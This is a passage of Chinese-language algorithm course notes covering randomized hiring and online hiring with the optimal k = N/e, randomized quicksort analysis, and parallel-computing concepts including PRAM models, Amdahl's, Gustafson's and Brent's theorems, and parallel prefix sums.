<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk12-__codelineno-1-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">RandomizedHiring</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">EventType</span><span class="w"> </span><span class="n">C</span><span class="p">[</span><span class="w"> </span><span class="p">],</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk12-__codelineno-1-2"></a><span class="p">{</span><span class="w">   </span><span class="cm">/* candidate 0 is a least-qualified dummy candidate */</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk12-__codelineno-1-3"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">Best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk12-__codelineno-1-4"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">BestQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">quality</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">candidate</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk12-__codelineno-1-5"></a>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk12-__codelineno-1-6"></a><span class="w">    </span><span class="n">randomly</span><span class="w"> </span><span class="n">permute</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">candidates</span><span class="p">;</span><span class="c1">//takes time</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ads-wk12-__codelineno-1-7"></a>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ads-wk12-__codelineno-1-8"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;=</span><span class="n">N</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ads-wk12-__codelineno-1-9"></a><span class="w">        </span><span class="n">Qi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">interview</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">);</span><span class="w"> </span><span class="cm">/* Ci */</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ads-wk12-__codelineno-1-10"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Qi</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">BestQ</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ads-wk12-__codelineno-1-11"></a><span class="w">            </span><span class="n">BestQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Qi</span><span class="p">;</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-ads-wk12-__codelineno-1-12"></a><span class="w">            </span><span class="n">Best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#note-ads-wk12-__codelineno-1-13"></a><span class="w">            </span><span class="n">hire</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">);</span><span class="w">  </span><span class="cm">/* Ch */</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#note-ads-wk12-__codelineno-1-14"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#note-ads-wk12-__codelineno-1-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#note-ads-wk12-__codelineno-1-16"></a><span class="p">}</span>
</span></code></pre></div>
<p>算法的关键在于生成随机排列。</p>
<p><mark class="critic">
Assign each element A[ i ] a random priority P[ i ],and sort
</mark></p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-ads-wk12-__codelineno-2-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">PermuteBySorting</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ElemType</span><span class="w"> </span><span class="n">A</span><span class="p">[</span><span class="w"> </span><span class="p">],</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-ads-wk12-__codelineno-2-2"></a><span class="p">{</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-ads-wk12-__codelineno-2-3"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;=</span><span class="n">N</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-ads-wk12-__codelineno-2-4"></a><span class="w">        </span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">P</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="p">(</span><span class="n">N</span><span class="o">^</span><span class="mi">3</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-ads-wk12-__codelineno-2-5"></a><span class="w">        </span><span class="cm">/* makes it more likely that all priorities are unique */</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-ads-wk12-__codelineno-2-6"></a><span class="w">    </span><span class="n">Sort</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="n">P</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sort</span><span class="w"> </span><span class="n">keys</span><span class="p">;</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-ads-wk12-__codelineno-2-7"></a><span class="p">}</span>
</span></code></pre></div>
<p>如果只Hire一个：</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-ads-wk12-__codelineno-3-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">OnlineHiring</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">EventType</span><span class="w"> </span><span class="n">C</span><span class="p">[</span><span class="w"> </span><span class="p">],</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-ads-wk12-__codelineno-3-2"></a><span class="p">{</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-ads-wk12-__codelineno-3-3"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">Best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">N</span><span class="p">;</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-ads-wk12-__codelineno-3-4"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">BestQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err"></span><span class="w"> </span><span class="p">;</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-ads-wk12-__codelineno-3-5"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;=</span><span class="n">k</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-ads-wk12-__codelineno-3-6"></a><span class="w">        </span><span class="n">Qi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">interview</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-ads-wk12-__codelineno-3-7"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Qi</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">BestQ</span><span class="w"> </span><span class="p">)</span><span class="w">   </span><span class="n">BestQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Qi</span><span class="p">;</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#note-ads-wk12-__codelineno-3-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#note-ads-wk12-__codelineno-3-9"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;=</span><span class="n">N</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#note-ads-wk12-__codelineno-3-10"></a><span class="w">        </span><span class="n">Qi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">interview</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#note-ads-wk12-__codelineno-3-11"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Qi</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">BestQ</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#note-ads-wk12-__codelineno-3-12"></a><span class="w">            </span><span class="n">Best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#note-ads-wk12-__codelineno-3-13"></a><span class="w">            </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#note-ads-wk12-__codelineno-3-14"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#note-ads-wk12-__codelineno-3-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#note-ads-wk12-__codelineno-3-16"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Best</span><span class="p">;</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#note-ads-wk12-__codelineno-3-17"></a><span class="p">}</span>
</span></code></pre></div>
<p>先随机挑选<code>k</code>个面试，取出其中最好的，然后从第<code>k+1</code>个开始，如果比最好的还好的话，就雇佣。</p>
<p><span class="arithmatex">\( S_i \)</span>: 第 <span class="arithmatex">\( i \)</span> 个申请者是最好的</p>
<p>要使 <span class="arithmatex">\( S_i \)</span> 成立，需要满足：</p>
<ul>
<li><span class="arithmatex">\( A \)</span>: 最好的申请者在位置 <span class="arithmatex">\( i \)</span>;概率为 <span class="arithmatex">\(\frac{1}{N}\)</span></li>
<li><span class="arithmatex">\( B \)</span>: 在位置 <span class="arithmatex">\( k+1 \)</span> 到 <span class="arithmatex">\( i-1 \)</span> 没有人被雇佣，也就是说，1到 <span class="arithmatex">\( i-1 \)</span> 中没有比挑出的 <span class="arithmatex">\( k \)</span> 个更好的(前 <span class="arithmatex">\( i-1 \)</span> 个中最好的在<span class="arithmatex">\(k\)</span>个中)，概率为 <span class="arithmatex">\(\frac{k}{(i-1)}\)</span></li>
</ul>
<p>概率计算：</p>
<div class="arithmatex">\[
\Pr[S_i] = \Pr[A \cap B] = \Pr[A] \cdot \Pr[B] = \frac{1}{N} \cdot \frac{k}{(i-1)} = \frac{k}{N(i-1)}
\]</div>
<div class="arithmatex">\[
    \Pr[S]= \sum_{i=k+1}^{N} \Pr[S_i] =\frac{k}{N} \sum_{i=k}^{N-1} \frac{1}{i}
\]</div>
<p>其被以下这个积分式子bound住</p>
<div class="arithmatex">\[
\int_{k}^{N} \frac{1}{x} \, dx \leqslant \sum_{i=k}^{N-1} \frac{1}{i} \leqslant \int_{k-1}^{N-1} \frac{1}{x} \, dx
\]</div>
<p>对于给定的 <span class="arithmatex">\( k \)</span>，雇佣到最优候选人的概率满足：</p>
<div class="arithmatex">\[
\frac{k}{N} \ln\left(\frac{N}{k}\right) \leqslant  \Pr[S] \leqslant \frac{k}{N} \ln\left(\frac{N-1}{k-1}\right)
\]</div>
<p>为了最大化这个概率，我们需要找到最佳的 <span class="arithmatex">\( k \)</span> 值：</p>
<p>通过求导并设导数为零，我们得到：</p>
<div class="arithmatex">\[
\frac{d}{dk} \left[ \frac{k}{N} \ln\left(\frac{N}{k}\right) \right] = \frac{1}{N} \left( \ln N - \ln k - 1 \right) = 0
\]</div>
<p>这意味着：</p>
<div class="arithmatex">\[
\ln k = \ln N - 1 \quad \Rightarrow \quad k = \frac{N}{e}
\]</div>
<p>带入</p>
<div class="arithmatex">\[
    f(k) = \frac{k}{N} \ln\left(\frac{N}{k}\right) \Rightarrow  max(f(k)) = \frac{1}{e}
\]</div>
<h2 id="note-ads-wk12-_2">随机化快速排序<a class="headerlink" href="#note-ads-wk12-_2" title="Permanent link">&para;</a></h2>
<p>对于传统的快速排序，最坏情况是每次选择的pivot都是最小或最大值，导致每次划分都只能减少一个元素，导致时间复杂度为<span class="arithmatex">\(O(N^2)\)</span>。</p>
<p>其平均时间复杂度为<span class="arithmatex">\(O(N\log N)\)</span>。</p>
<p>如果我们随机选择pivot，并希望这个pivot满足：</p>
<p>中心分割:= 选择一个枢轴，使得每一侧至少包含 <span class="arithmatex">\(\frac{n}{4}\)</span> 个元素</p>
<p>改进快速排序:= 在递归之前总是选择一个中心分割</p>
<div class="admonition note">
<p class="admonition-title">期望意义下两次选中</p>
<p>The expected number of iterations needed until we find a central splitter is at most 2.</p>
<p>每一次，选中的概率是<span class="arithmatex">\(\frac{1}{2}\)</span>，需要选一个中心分割，所以n次伯努利试验期望意义下需要选两次，n=2。
或者，以几何分布的眼光来看，成功的概率是<span class="arithmatex">\(\frac{1}{2}\)</span>，所以期望意义下需要选两次。</p>
</div>
<p>定义：</p>
<p>Type <span class="arithmatex">\( j \)</span>: the subproblem <span class="arithmatex">\( S \)</span> is of type <span class="arithmatex">\( j \)</span> if <span class="arithmatex">\( N \left( \frac{3}{4} \right)^{j+1} \leq |S| \leq N \left( \frac{3}{4} \right)^j \)</span></p>
<p>推出: There are at most <span class="arithmatex">\( \left( \frac{4}{3} \right)^{j+1} \)</span> subproblems of type <span class="arithmatex">\( j \)</span>.</p>
<p>因为下界要小于<span class="arithmatex">\(N\)</span></p>
<p>一个typej的期望成本为</p>
<div class="arithmatex">\[
E[T_{\text{type } j}] = O\left(N \left( \frac{3}{4} \right)^j \right) \times \left( \frac{4}{3} \right)^{j+1} = O(N)
\]</div>
<p>不同的type的个数为</p>
<p>Number of different types = <span class="arithmatex">\( \log_{4/3} N = O(\log N) \)</span></p>
<p>This results in a total complexity of <span class="arithmatex">\( O(N \log N) \)</span>.</p></section><section class="print-page" id="note-ads-wk13" heading-number="2.2.3.15"><h1 id="note-ads-wk13-_1">并行算法<a class="headerlink" href="#note-ads-wk13-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 5345 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 10 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 7 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 19 分钟</p>
</div>
<p>并行算法的设计是为了提高计算效率和性能。随着数据量的增加和计算任务的复杂化，单一处理器的计算能力已经无法满足需求。通过并行算法，可以将一个大的计算任务分解成多个小任务，并行执行，从而显著减少计算时间
。从而更好利用现代计算机多核的优势</p>
<h2 id="note-ads-wk13-_2">概念与定理<a class="headerlink" href="#note-ads-wk13-_2" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p><strong>加速比 (Speedup)</strong>  是指在并行计算中，使用 <span class="arithmatex">\( p \)</span> 个处理器时相对于使用一个处理器时的性能提升比例，记为 <span class="arithmatex">\( S(p) \)</span>，</p>
<div class="arithmatex">\[ S(p) = \frac{T_1}{T_p} \]</div>
<p>其中 <span class="arithmatex">\( T_1 \)</span> 是使用一个处理器时的运行时间，<span class="arithmatex">\( T_p \)</span> 是使用 <span class="arithmatex">\( p \)</span> 个处理器时的运行时间。</p>
<p>理想加速比:</p>
<div class="arithmatex">\[ S(p) = \frac{T_1}{T_p} = p \]</div>
<p><strong>内存共享方式</strong></p>
<ol>
<li>
<p><strong>EREW (Exclusive Read Exclusive Write)</strong>: 每个内存位置在任意时刻只能被一个处理器读取或写入；</p>
</li>
<li>
<p><strong>CREW (Concurrent Read Exclusive Write)</strong>: 每个内存位置在任意时刻可以被多个处理器读取，但只能被一个处理器写入；</p>
</li>
<li>
<p><strong>CRCW (Concurrent Read Concurrent Write)</strong>: 每个内存位置在任意时刻可以被多个处理器读取或写入，因为写入涉及到同时写入不同值可能造成的冲突。因此写入策略可以分如下三种:</p>
<p>(a) <strong>CRCW-C (Common)</strong>: 所有处理器写入的值相同时才会写入；</p>
<p>(b) <strong>CRCW-A (Arbitrary)</strong>: 所有处理器写入的值可以不同，任意读取其中一个写入即可；</p>
<p>&copy; <strong>CRCW-P (Priority)</strong>: 所有处理器写入的值可以不同，但存在一个优先级，只有优先级最高的写入才会生效。</p>
</li>
</ol>
</div>
<div class="admonition info">
<p class="admonition-title">阿姆达尔定律</p>
<p>设 <span class="arithmatex">\( 0 \leqslant f \leqslant 1 \)</span> 是一个程序中必须串行执行的部分的比例，那么使用 <span class="arithmatex">\( p \)</span> 个处理器的最大加速比 <span class="arithmatex">\( S(p) \)</span> 满足</p>
<div class="arithmatex">\[
S(p) = \frac{1}{f + (1-f)/p}
\]</div>
<p><strong>证明</strong>: 设整个程序中串行部分的时间为 <span class="arithmatex">\( t \)</span>，那么串行部分的时间为 <span class="arithmatex">\( ft \)</span>，并行部分的时间为 <span class="arithmatex">\( (1-f)t \)</span>。使用 <span class="arithmatex">\( p \)</span> 个处理器时，串行部分的时间不变，而并行部分的时间最少为 <span class="arithmatex">\( (1-f)t/p \)</span>，因此总的时间最少为 <span class="arithmatex">\( ft + (1-f)t/p \)</span>，因此加速比最大为</p>
<div class="arithmatex">\[
S(p) = \frac{t}{ft + (1-f)t/p} = \frac{1}{f + (1-f)/p}
\]</div>
<p>这个定律假定串行部分不可独立于问题大小</p>
</div>
<div class="admonition info">
<p class="admonition-title">Gustafson定律</p>
<p>设某个程序使用 <span class="arithmatex">\( p \)</span> 个处理器并行执行时，串行部分花费的时间为 <span class="arithmatex">\( f_1 \)</span>（不是比例），并行部分花费的时间为 <span class="arithmatex">\( f_2 \)</span>，那么使用 <span class="arithmatex">\( p \)</span> 个处理器的最大加速比 <span class="arithmatex">\( S(p) \)</span> 满足</p>
<div class="arithmatex">\[
S(p) = \frac{f_1 + f_2 \cdot p}{f_1 + f_2}
\]</div>
<p><strong>证明</strong>: 由此可知，使用 <span class="arithmatex">\( p \)</span> 个处理器并行执行的时间为 <span class="arithmatex">\( T_p = f_1 + f_2 \)</span>，使用一个处理器单件执行的时间应当为 <span class="arithmatex">\( T_1 = f_1 + f_2 \cdot p \)</span>，因此加速比为</p>
<div class="arithmatex">\[
S(p) = \frac{T_1}{T_p} = \frac{f_1 + f_2 \cdot p}{f_1 + f_2}
\]</div>
</div>
<div class="admonition info">
<p class="admonition-title">孙-倪定律</p>
<p>定理 14.4 (孙-倪定律, 1990) 设某个程序串行部分占比为 <span class="arithmatex">\( f \)</span>，并行部分占比为 <span class="arithmatex">\( 1-f \)</span>，内存受限函数为 <span class="arithmatex">\( G(p) \)</span>，那么使用 <span class="arithmatex">\( p \)</span> 个处理器的最大加速比 <span class="arithmatex">\( S(p) \)</span> 满足</p>
<div class="arithmatex">\[
S(p) = \frac{f + (1-f) \cdot G(p)}{f + \frac{(1-f) \cdot G(p)}{p}}
\]</div>
</div>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<div class="arithmatex">\[
     D = T_{\infty}
\]</div>
<p><span class="arithmatex">\(D\)</span> 具有无穷多个处理器时的时间</p>
<div class="arithmatex">\[
    W = T_1
\]</div>
<p><span class="arithmatex">\(W\)</span> 是使用一个处理器时的时间</p>
<div class="arithmatex">\[
    \frac{D}{W} = \frac{T_{\infty}}{T_1}
\]</div>
<p>定义为算法的平均并行度</p>
</div>
<div class="admonition info">
<p class="admonition-title">布伦特定律</p>
<p>定理 14.5 (布伦特定律, Brent's Theorem) 设一个并行计算用到的工作量为 <span class="arithmatex">\( W \)</span>，关键路径长度为 <span class="arithmatex">\( D \)</span>，那么使用 <span class="arithmatex">\( p \)</span> 个处理器的并行时间满足如下不等式：</p>
<div class="arithmatex">\[
\frac{W}{p} \leqslant T_p \leqslant \frac{W - D}{p} + D
\]</div>
<p>证明: 下界是显然的，因为 <span class="arithmatex">\( T_p \geqslant T_{\infty} \)</span>，而 <span class="arithmatex">\( T_{\infty} \)</span> 也是受理想模型加速比的限制的，因此 <span class="arithmatex">\( T_p \geqslant W/p \)</span>。</p>
<p>对于上界，因为关键路径长度为 <span class="arithmatex">\( D \)</span>，因此能够并行执行的计算可以分为 <span class="arithmatex">\( D \)</span> 个内部任务，互相之间有前后的依赖，设每个阶段的工作量为 <span class="arithmatex">\( W_i \)</span>，则有</p>
<div class="arithmatex">\[
W = \sum_{i=1}^{D} W_i
\]</div>
<p>使用 <span class="arithmatex">\( p \)</span> 个处理器时，每一个阶段所需的时间为 <span class="arithmatex">\( \lceil W_i/p \rceil \)</span>，向上取整的原因在于，每个阶段的工作量可能不能被整除。因此如果任务分成了 7 个任务，每个任务有 3 个处理器，那么每个处理器会分到的任务个数是 2, 2, 3。</p>
<p>因此我们需要的时间就是</p>
<div class="arithmatex">\[
T_p = \sum_{i=1}^{D} \left\lceil \frac{W_i}{p} \right\rceil = \sum_{i=1}^{D} \left( \left\lfloor \frac{W_i - 1}{p} \right\rfloor + 1 \right) \leqslant \sum_{i=1}^{D} \left( \frac{W_i - 1}{p} + 1 \right) = \frac{W - D}{p} + D.
\]</div>
<p>其中我们使用了等式</p>
<div class="arithmatex">\[
\left\lceil \frac{x}{y} \right\rceil = \left\lfloor \frac{x+y-1}{y} \right\rfloor + 1
\]</div>
</div>
<h2 id="note-ads-wk13-_3">前缀和问题<a class="headerlink" href="#note-ads-wk13-_3" title="Permanent link">&para;</a></h2>
<p>首先，对于求和问题，可以转换为二叉树的求和问题，每个节点表示一个求和操作，每个节点有两个子节点，分别表示两个求和操作。</p>
<figure>
  <img alt="Image title" src="../NOTE/ADS/sum.png" width="70%" />
<br />
<figcaption>求和问题</figcaption>
</figure>
<p>对于前缀和问题，先定义如下式子</p>
<div class="arithmatex">\[
    C(h,i) = \sum_{k=0}^{\alpha} A(k)
\]</div>
<p>其中 <span class="arithmatex">\( h \)</span> 表示树的高度，<span class="arithmatex">\( i \)</span> 表示树的第 <span class="arithmatex">\( i \)</span> 个节点，<span class="arithmatex">\( \alpha \)</span> 表示树的最右下角节点的 <span class="arithmatex">\( i \)</span> 值，<span class="arithmatex">\( A(k) \)</span> 表示数组 <span class="arithmatex">\( A \)</span> 的第 <span class="arithmatex">\( k \)</span> 个元素。</p>
<p>在计算前缀和时，先从上往下计算得到每一个部分和的<span class="arithmatex">\(B\)</span>值，然后从下往上计算得到每一个部分和的<span class="arithmatex">\(C\)</span>值。</p>
<p>并且运用以下性质</p>
<ol>
<li>
<p>如果 <span class="arithmatex">\( i = 1 \)</span>，那么 <span class="arithmatex">\( C(h, i) = B(h, i) \)</span>，这是因为 <span class="arithmatex">\( i = 1 \)</span> 的时候，根据定义，<span class="arithmatex">\( C(h, 1) \)</span> 是从第 1 个元素加到这 <span class="arithmatex">\( i \)</span> 点为根的子树右下角的叶子节点。而 <span class="arithmatex">\( B(h, 1) \)</span> 实际上也就是从第一个元素加到这 <span class="arithmatex">\( i \)</span> 点为根的子树右下角的叶子（看图可以很清楚地看出）。</p>
</li>
<li>
<p>如果 <span class="arithmatex">\( i \)</span> 是偶数，这表明这 <span class="arithmatex">\( i \)</span> 点是其父点的右儿子，因此它和它的父亲根右下角的叶子是同一个，因此有 <span class="arithmatex">\( C(h, i) = C(h + 1, i/2) \)</span>;</p>
</li>
<li>
<p>如果 <span class="arithmatex">\( i \)</span> 是奇数且不是 1，这表明这一点是某个点的左儿子，首先它自己的值 <span class="arithmatex">\( B(h, i) \)</span> 不是从 1 开始加的，所以我们要选一个左边的点，把从 1 开始加到这个点对应的之前的部分补上，即 <span class="arithmatex">\( C(h, i) = C(h + 1, (i - 1)/2) + B(h, i) \)</span>。需要注意的是，如果不是并行算法，<span class="arithmatex">\( C(h + 1, (i - 1)/2) \)</span> 可以替换为 <span class="arithmatex">\( C(h, i - 1) \)</span>，但因为并行算法要求每一行是一起算出来的，所以要用上一行的才合理。或者用他父亲的<span class="arithmatex">\(C\)</span>减去他兄弟的<span class="arithmatex">\(B\)</span></p>
</li>
</ol>
<figure>
  <img alt="Image title" src="../NOTE/ADS/presum.png" width="80%" />
<br />
<figcaption>前缀和问题</figcaption>
</figure>
